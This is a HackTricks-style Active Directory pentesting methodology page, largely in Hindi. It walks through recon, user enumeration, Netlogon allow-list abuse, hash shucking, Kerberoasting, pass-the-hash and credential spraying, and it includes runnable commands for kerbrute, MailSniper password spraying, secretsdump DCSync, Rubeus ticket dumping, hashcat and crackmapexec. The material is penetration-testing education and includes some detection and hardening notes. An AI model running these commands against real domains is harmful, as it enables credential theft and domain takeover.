# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** एक foundational technology के रूप में काम करता है, जो **network administrators** को **domains**, **users**, और **objects** को network के भीतर efficiently create और manage करने में सक्षम बनाता है। इसे scale करने के लिए engineered किया गया है, जिससे बड़ी संख्या में users को manageable **groups** और **subgroups** में organize करना आसान होता है, जबकि विभिन्न levels पर **access rights** को control किया जाता है।

**Active Directory** की structure तीन primary layers से बनी होती है: **domains**, **trees**, और **forests**। एक **domain** objects के एक collection को encompass करता है, जैसे **users** या **devices**, जो एक common database share करते हैं। **Trees** इन domains के groups होते हैं जो एक shared structure से जुड़े होते हैं, और एक **forest** multiple trees के collection को दर्शाता है, जो **trust relationships** के माध्यम से interconnected होते हैं, और organizational structure की सबसे ऊपरी layer बनाते हैं। Specific **access** और **communication rights** इन levels में से प्रत्येक पर designated किए जा सकते हैं।

**Active Directory** के key concepts में शामिल हैं:

1. **Directory** – Active Directory objects से संबंधित सभी information को houses करता है।
2. **Object** – directory के भीतर entities को दर्शाता है, जिनमें **users**, **groups**, या **shared folders** शामिल हैं।
3. **Domain** – directory objects के लिए एक container के रूप में काम करता है, और एक **forest** के भीतर multiple domains के coexist करने की capability देता है, जहाँ प्रत्येक अपना object collection maintain करता है।
4. **Tree** – domains का एक grouping जो एक common root domain share करते हैं।
5. **Forest** – Active Directory में organizational structure का pinnacle, जो कई trees से मिलकर बना होता है और उनके बीच **trust relationships** होती हैं।

**Active Directory Domain Services (AD DS)** network के भीतर centralized management और communication के लिए critical services की एक range को encompass करता है। इन services में शामिल हैं:

1. **Domain Services** – data storage को centralize करता है और **users** और **domains** के बीच interactions को manage करता है, जिसमें **authentication** और **search** functionalities शामिल हैं।
2. **Certificate Services** – secure **digital certificates** के creation, distribution, और management की oversight करता है।
3. **Lightweight Directory Services** – **LDAP protocol** के माध्यम से directory-enabled applications को support करता है।
4. **Directory Federation Services** – एक single session में multiple web applications across users को authenticate करने के लिए **single-sign-on** capabilities प्रदान करता है।
5. **Rights Management** – unauthorized distribution और use को regulate करके copyright material की safeguarding में मदद करता है।
6. **DNS Service** – **domain names** के resolution के लिए crucial है।

अधिक detailed explanation के लिए देखें: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

यह सीखने के लिए कि **attack an AD** कैसे करना है, आपको **Kerberos authentication process** को बहुत अच्छी तरह **understand** करना होगा।\
[**यदि आपको अभी भी नहीं पता कि यह कैसे काम करता है, तो यह page पढ़ें।**](kerberos-authentication.md)

## Cheat Sheet

आप जल्दी overview के लिए [https://wadcoms.github.io/](https://wadcoms.github.io) पर बहुत कुछ देख सकते हैं कि AD को enumerate/exploit करने के लिए कौन-से commands run किए जा सकते हैं।

> [!WARNING]
> Kerberos communication **actions perform** करने के लिए एक full qualifid name (FQDN) **requires** करती है। यदि आप IP address से machine access करने की कोशिश करते हैं, तो **यह NTLM use करेगा और kerberos नहीं**।

## Recon Active Directory (No creds/sessions)

यदि आपके पास केवल AD environment तक access है लेकिन आपके पास कोई credentials/sessions नहीं हैं, तो आप यह कर सकते हैं:

- **Pentest the network:**
- Network scan करें, machines और open ports खोजें, और कोशिश करें कि उन पर **exploit vulnerabilities** करें या उनसे **credentials extract** करें (उदाहरण के लिए, [printers could be very interesting targets](ad-information-in-printers.md).
- DNS enumerating से domain में web, printers, shares, vpn, media, आदि जैसे key servers की information मिल सकती है।
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- यह कैसे करना है, इसकी और जानकारी के लिए General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) देखें।
- **smb services पर null और Guest access check करें** (यह modern Windows versions पर काम नहीं करेगा):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB server को enumerate करने की अधिक detailed guide यहाँ मिल सकती है:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Ldap enumerate करें**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP को enumerate करने की अधिक detailed guide यहाँ मिल सकती है (anonymous access पर **special attention** दें):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Network poison करें**
- [**Responder के साथ services impersonating करके**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) credentials gather करें
- [**relay attack का abuse करके**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) host access करें
- [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) expose करके credentials gather करें
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- internal documents, social media, services (mainly web) के अंदर से, और publicly available sources से usernames/names extract करें।
- यदि आपको company workers के complete names मिल जाते हैं, तो आप अलग-अलग AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)) आज़मा सकते हैं। सबसे common conventions हैं: _NameSurname_, _Name.Surname_, _NamSur_ (प्रत्येक के 3 letters), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123)।
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) और [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) pages देखें।
- **Kerbrute enum**: जब एक **invalid username is requested** किया जाता है, server **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ के साथ respond करेगा, जिससे हम यह निर्धारित कर सकते हैं कि username invalid था। **Valid usernames** या तो **AS-REP** response में **TGT** देंगे या error _KRB5KDC_ERR_PREAUTH_REQUIRED_, जो बताता है कि user को pre-authentication perform करनी है।
- **MS-NRPC पर No Authentication**: Domain controllers पर MS-NRPC (Netlogon) interface के खिलाफ auth-level = 1 (No authentication) का use। Method `DsrGetDcNameEx2` function को MS-NRPC interface bind करने के बाद call करता है ताकि बिना किसी credentials के check किया जा सके कि user या computer मौजूद है या नहीं। [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool इस type की enumeration implement करता है। Research यहाँ मिल सकती है [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

यदि आपने नेटवर्क में इनमें से कोई server पाया है, तो आप इसके खिलाफ **user enumeration** भी कर सकते हैं। उदाहरण के लिए, आप [**MailSniper**](https://github.com/dafthack/MailSniper) tool का उपयोग कर सकते हैं:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> आप [**इस github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) और यह वाला ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) में usernames की lists पा सकते हैं।
>
> हालांकि, आपके पास इस कंपनी पर काम करने वाले लोगों के **नाम** recon step से होने चाहिए, जिसे आपको इससे पहले perform करना चाहिए था। नाम और surname के साथ आप script [**namemash.py**](https://gist.github.com/superkojiman/11076951) का उपयोग करके संभावित valid usernames generate कर सकते हैं।

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

**Zerologon** patch होने के बाद भी DC पर, explicitly allow-listed accounts अभी भी **legacy/vulnerable Netlogon secure-channel behavior** के लिए exposed हो सकते हैं। जोखिम वाला configuration GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** या matching registry value **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`** है।

यह value एक **SDDL security descriptor** है ([Security Descriptors](security-descriptors.md) देखें)। DACL में relevant ACE दी गई कोई भी account या group target की जा सकती है। उदाहरण के लिए, `O:BAG:BAD:(A;;RC;;;WD)` effectively **Everyone** को allow-list करता है।

Practical operator workflow:

1. **SYSVOL/GPO** और **live DC registry** दोनों को check करके allow-listed principals identify करें।
2. SDDL में मिले **SIDs** को real AD users/computers में resolve करें और **DC machine accounts**, **trust accounts**, और अन्य privileged machines को prioritize करें।
3. allow-listed account के रूप में बार-बार **MS-NRPC / Netlogon authentication** attempt करें।
4. Successful guess के बाद, target account password reset करने के लिए **Netlogon password-setting** abuse करें (public PoC इसे empty string पर set करता है)।

Public artifact से quick triage / lab examples:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- The **scanner** उपयोगी है क्योंकि effective allow-list **SYSVOL**, **registry**, या दोनों में मौजूद हो सकती है।
- exploit path स्वयं महत्वपूर्ण है क्योंकि vulnerable account की पहचान होने के बाद इसे **Domain Admin privileges** की आवश्यकता **नहीं होती**।
- **Domain Controller machine account** जैसे `DC$` को compromise करना खास तौर पर खतरनाक है क्योंकि उस password को reset करने से सीधे व्यापक **AD takeover** paths सक्षम हो सकते हैं।
- **Brute-force feasibility** mode पर निर्भर करती है: public artifact meet-in-the-middle approach, किसी दूसरे computer account के उपलब्ध होने पर **24-bit** brute force, और धीमे **32-bit** variants का वर्णन करता है।

Detection / hardening notes:

- allow-list policy का audit करें और temporary, explicitly required compatibility exceptions के अलावा सब कुछ remove करें।
- vulnerable Netlogon connections being denied, discovered, या policy द्वारा explicitly allowed को पकड़ने के लिए DC **System** events **5827/5828/5829/5830/5831** monitor करें।
- legacy dependency हटने तक `VulnerableChannelAllowList` में accounts को **high-risk** मानें।

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

You might be able to **obtain** some challenge **hashes** to crack **poisoning** some protocols of the **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- जब **SMB relay to the DC को signing द्वारा block** किया गया हो, तब भी **LDAP** posture probe करें: `netexec ldap <dc>` `(signing:None)` / weak channel binding दिखाता है। ऐसा DC जिसमें SMB signing required हो लेकिन LDAP signing disabled हो, फिर भी **relay-to-LDAP** target के रूप में viable रहता है, खासकर **SPN-less RBCD** जैसे abuses के लिए।

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs कभी-कभी HTML में **masked admin passwords embed** करती हैं। source/devtools देखने पर cleartext मिल सकता है (e.g., `<input value="<password>">`), जिससे Basic-auth access लेकर scan/print repositories तक पहुंच मिलती है।
- Retrieved print jobs में plaintext onboarding docs हो सकते हैं, जिनमें per-user passwords होते हैं। Testing के दौरान pairings को aligned रखें:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### NTLM क्रेड्स चुराएँ

अगर आप **null या guest user** के साथ **other PCs या shares** तक **access** कर सकते हैं, तो आप **files** (जैसे SCF file) **place** कर सकते हैं, जिन्हें अगर किसी तरह **access** किया गया, तो वे **आपके खिलाफ NTLM authentication trigger** करेंगे, ताकि आप **NTLM challenge** को **steal** करके उसे crack कर सकें:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** हर उस NT hash को, जो आपके पास पहले से है, दूसरे, धीमे formats के लिए एक candidate password मानता है, जिनका key material सीधे NT hash से derive होता है। Kerberos RC4 tickets, NetNTLM challenges, या cached credentials में लंबे passphrases को brute-force करने के बजाय, आप NT hashes को Hashcat के NT-candidate modes में feed करते हैं और plaintext जाने बिना password reuse validate करते हैं। यह खास तौर पर domain compromise के बाद असरदार होता है, जब आप हजारों current और historical NT hashes harvest कर सकते हैं।

Shucking का उपयोग तब करें जब:

- आपके पास DCSync, SAM/SECURITY dumps, या credential vaults से NT corpus हो और आपको दूसरे domains/forests में reuse test करना हो।
- आप RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, या DCC/DCC2 blobs capture करें।
- आप लंबे, uncrackable passphrases के लिए reuse जल्दी prove करना चाहते हों और तुरंत Pass-the-Hash के जरिए pivot करना चाहते हों।

यह technique उन encryption types के खिलाफ **काम नहीं करती** जिनकी keys NT hash नहीं होतीं (जैसे, Kerberos etype 17/18 AES)। अगर कोई domain AES-only enforce करता है, तो आपको regular password modes पर लौटना होगा।

#### NT hash corpus बनाना

- **DCSync/NTDS** – `secretsdump.py` को history के साथ इस्तेमाल करें ताकि संभव हो सके उतने ज्यादा NT hashes (और उनके पिछले values) निकाल सकें:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries candidate pool को काफी बढ़ा देती हैं क्योंकि Microsoft प्रति account up to 24 previous hashes store कर सकता है। NTDS secrets harvest करने के और तरीकों के लिए देखें:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (या Mimikatz `lsadump::sam /patch`) local SAM/SECURITY data और cached domain logons (DCC/DCC2) extract करता है। इन hashes को deduplicate करके उसी `nt_candidates.txt` list में जोड़ें।
- **Metadata track करें** – हर hash के साथ उसे produce करने वाला username/domain रखें (भले ही wordlist में सिर्फ hex हो)। Matching hashes आपको तुरंत बता देते हैं कि कौन-सा principal password reuse कर रहा है, जैसे ही Hashcat winning candidate print करता है।
- उसी forest या trusted forest के candidates को प्राथमिकता दें; इससे shucking में overlap की संभावना अधिकतम होती है।

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **raw 32-hex NT hashes** ही रहने चाहिए। Rule engines disable करें (`-r` नहीं, hybrid modes नहीं), क्योंकि mangling candidate key material को corrupt कर देता है।
- ये modes inherently faster नहीं हैं, लेकिन NTLM keyspace (~30,000 MH/s on an M3 Max) Kerberos RC4 (~300 MH/s) से ~100× तेज़ है। Slow format में पूरे password space को explore करने की तुलना में एक curated NT list test करना बहुत सस्ता है।
- हमेशा **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) चलाएँ, क्योंकि modes 31500/31600/35300/35400 हाल ही में आए हैं।
- अभी AS-REQ Pre-Auth के लिए कोई NT mode नहीं है, और AES etypes (19600/19700) को plaintext password चाहिए, क्योंकि उनकी keys PBKDF2 के जरिए UTF-16LE passwords से derive होती हैं, raw NT hashes से नहीं।

#### उदाहरण – Kerberoast RC4 (mode 35300)

1. कम-privileged user के साथ target SPN के लिए RC4 TGS capture करें (details के लिए Kerberoast page देखें):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. अपने NT list के साथ ticket को shuck करें:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat हर NT candidate से RC4 key derive करता है और `$krb5tgs$23$...` blob validate करता है। Match यह confirm करता है कि service account आपके existing NT hashes में से एक use करता है।

3. तुरंत PtH के जरिए pivot करें:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

अगर जरूरत हो, तो आप बाद में plaintext को `hashcat -m 1000 <matched_hash> wordlists/` से recover कर सकते हैं।

#### उदाहरण – Cached credentials (mode 31600)

1. Compromised workstation से cached logons dump करें:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Interesting domain user के लिए DCC2 line को `dcc2_highpriv.txt` में copy करें और उसे shuck करें:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Successful match से आपको वही NT hash मिलता है जो आपकी list में पहले से known है, जिससे साबित होता है कि cached user password reuse कर रहा है। इसे सीधे PtH के लिए use करें (`nxc smb <dc_ip> -u highpriv -H <hash>`) या string recover करने के लिए इसे fast NTLM mode में brute-force करें।

यही exact workflow NetNTLM challenge-responses (`-m 27000/27100`) और DCC (`-m 31500`) पर भी लागू होता है। Match identify होते ही आप relay, SMB/WMI/WinRM PtH, या NT hash को masks/rules के साथ offline re-crack कर सकते हैं।



## Credentials/session के साथ Active Directory enumerate करना

इस phase के लिए आपके पास **compromised credentials या valid domain account की session** होना जरूरी है। अगर आपके पास कुछ valid credentials हैं या domain user के रूप में shell है, तो **याद रखें कि पहले दिए गए options अभी भी दूसरे users को compromise करने के लिए उपलब्ध हैं**।

Authenticated enumeration शुरू करने से पहले आपको **Kerberos double hop problem** के बारे में जानना चाहिए।


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

किसी account को compromise करना **पूरे domain को compromise करने की शुरुआत का बड़ा step** है, क्योंकि अब आप **Active Directory Enumeration** शुरू कर सकते हैं:

[**ASREPRoast**](asreproast.md) के मामले में अब आप हर संभावित vulnerable user ढूँढ सकते हैं, और [**Password Spraying**](password-spraying.md) के मामले में आप **सभी usernames की list** प्राप्त कर सकते हैं और compromised account का password, empty passwords और नए promising passwords आज़मा सकते हैं।

- आप [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) का उपयोग कर सकते हैं
- आप [**powershell for recon**](../basic-powershell-for-pentesters/index.html) भी उपयोग कर सकते हैं, जो ज्यादा stealthy होगा
- आप [**use powerview**](../basic-powershell-for-pentesters/powerview.md) का उपयोग करके अधिक detailed information निकाल सकते हैं
- Active Directory में recon के लिए एक और शानदार tool है [**BloodHound**](bloodhound.md). यह बहुत stealthy **नहीं** है (आपके द्वारा उपयोग किए गए collection methods पर निर्भर), लेकिन **अगर आपको इसकी परवाह नहीं है**, तो इसे जरूर आज़माएँ। देखें कि users कहाँ RDP कर सकते हैं, दूसरे groups तक path खोजें, आदि।
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**AD के DNS records**](ad-dns-records.md) क्योंकि उनमें दिलचस्प जानकारी हो सकती है।
- एक **GUI वाला tool** जिसे आप directory enumerate करने के लिए use कर सकते हैं वह है **AdExplorer.exe** from **SysInternal** Suite।
- आप LDAP database में **ldapsearch** के साथ search करके fields _userPassword_ & _unixUserPassword_, या _Description_ में credentials ढूँढ सकते हैं। अन्य methods के लिए cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)
- अगर आप **Linux** use कर रहे हैं, तो आप [**pywerview**](https://github.com/the-useless-one/pywerview) से भी domain enumerate कर सकते हैं।
- आप automated tools भी try कर सकते हैं:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **सभी domain users निकालना**

Windows से सभी domain usernames प्राप्त करना बहुत आसान है (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`)। Linux में, आप यह इस्तेमाल कर सकते हैं: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> भले ही यह Enumeration section छोटा लगे, यह सबसे महत्वपूर्ण हिस्सा है। links खोलें (मुख्यतः cmd, powershell, powerview और BloodHound वाले), सीखें कि domain कैसे enumerate करना है और तब तक practice करें जब तक आप comfortable महसूस न करें। एक assessment के दौरान, यह DA तक पहुँचने का रास्ता खोजने या यह तय करने का key moment होगा कि कुछ नहीं किया जा सकता।

### Kerberoast

Kerberoasting में services से जुड़े user accounts द्वारा उपयोग किए जाने वाले **TGS tickets** प्राप्त करना और उनकी encryption को crack करना शामिल है—जो user passwords पर आधारित होती है—**offline**।

इस बारे में और जानकारी:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

एक बार जब आप कुछ credentials प्राप्त कर लेते हैं, तो आप check कर सकते हैं कि क्या किसी **machine** तक आपकी पहुँच है। इसके लिए, आप **CrackMapExec** का उपयोग कई servers पर अलग-अलग protocols के साथ connect करने की कोशिश करने के लिए कर सकते हैं, आपके ports scans के अनुसार।

### Local Privilege Escalation

अगर आपने credentials या regular domain user की session compromise कर ली है और इस user के साथ **domain की किसी भी machine** तक आपकी **access** है, तो आपको locally privileges **escalate** करने और credentials looting करने का रास्ता ढूँढना चाहिए। ऐसा इसलिए है क्योंकि केवल local administrator privileges के साथ ही आप memory (LSASS) और locally (SAM) में अन्य users के hashes **dump** कर पाएँगे।

इस book में [**Windows में local privilege escalation**](../windows-local-privilege-escalation/index.html) और एक [**checklist**](../checklist-windows-privilege-escalation.md) पर एक पूरा page है। साथ ही, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) का उपयोग करना न भूलें।

### Current Session Tickets

यह बहुत **unlikely** है कि आपको current user में ऐसे **tickets** मिलेंगे जो आपको unexpected resources तक पहुँचने की **permission** दें, लेकिन आप check कर सकते हैं:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

अगर आपने active directory को enumerate कर लिया है, तो आपके पास **ज्यादा emails** होंगी और **network की बेहतर समझ** होगी। आप NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.** को force कर पाने में सक्षम हो सकते हैं।

### कंप्यूटर Shares में Creds ढूँढना | SMB Shares

अब जब आपके पास कुछ basic credentials हैं, तो आपको check करना चाहिए कि क्या आप AD के अंदर shared कोई **interesting files** **find** कर सकते हैं। आप यह manually कर सकते हैं, लेकिन यह बहुत boring repetitive task है (और अगर आपको hundreds of docs check करने हों तो और भी).

[**इन tools के बारे में जानने के लिए इस link को follow करें।**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM Creds चुराना

अगर आप **other PCs या shares** access कर सकते हैं, तो आप **files** (जैसे SCF file) **place** कर सकते हैं, जिन्हें अगर somehow access किया जाए तो वे आपके खिलाफ **NTLM authentication trigger** करेंगे, ताकि आप **NTLM challenge** को crack करने के लिए **steal** कर सकें:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

इस vulnerability ने किसी भी authenticated user को **domain controller compromise** करने की अनुमति दी।


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**निम्न techniques के लिए एक regular domain user काफी नहीं है, इन attacks को perform करने के लिए आपको कुछ special privileges/credentials चाहिए।**

### Hash extraction

उम्मीद है आपने [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) का उपयोग करके किसी **local admin** account को **compromise** कर लिया होगा।\
फिर समय है memory में और locally मौजूद सभी hashes को dump करने का।\
[**hashes प्राप्त करने के अलग-अलग तरीकों के बारे में इस page को पढ़ें।**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**जैसे ही आपके पास किसी user का hash होता है**, आप इसका उपयोग उसे **impersonate** करने के लिए कर सकते हैं।\
आपको किसी ऐसे **tool** का उपयोग करना होगा जो उस **hash** का उपयोग करके **NTLM authentication perform** करेगा, **या** आप एक नया **sessionlogon** बना सकते हैं और उस **hash** को **LSASS** में **inject** कर सकते हैं, ताकि जब भी कोई **NTLM authentication perform** हो, वही **hash use** किया जाए। आखिरी option वही है जो mimikatz करता है।\
[**अधिक जानकारी के लिए इस page को पढ़ें।**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

इस attack का उद्देश्य NTLM protocol पर सामान्य Pass The Hash के विकल्प के रूप में user NTLM hash का उपयोग करके Kerberos tickets request करना है। इसलिए, यह खास तौर पर **उन networks में उपयोगी** हो सकता है जहाँ NTLM protocol disabled है और authentication protocol के रूप में केवल **Kerberos allowed** है।


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** attack method में, attackers password या hash values की बजाय **user का authentication ticket steal** करते हैं। फिर इस चुराए गए ticket का उपयोग **user को impersonate** करने के लिए किया जाता है, जिससे network के अंदर resources और services तक unauthorized access मिलती है।


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

अगर आपके पास किसी **local administrator** का **hash** या **password** है, तो आपको इसे अन्य **PCs** पर **locally login** करने के लिए try करना चाहिए।
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> ध्यान दें कि यह काफी **noisy** है और **LAPS** इसे **mitigate** करेगा।

### MSSQL Abuse & Trusted Links

